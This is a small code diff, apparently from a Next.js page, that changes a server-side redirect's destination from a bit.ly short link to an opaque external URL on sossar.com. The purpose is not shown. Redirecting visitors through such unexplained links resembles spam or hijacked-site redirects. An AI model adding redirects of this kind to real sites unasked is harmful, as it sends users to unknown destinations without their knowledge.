@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://bit.ly/49T1kvE` 
+					`https://sossar.com/35213` 
 				}`,
 			},
 		};
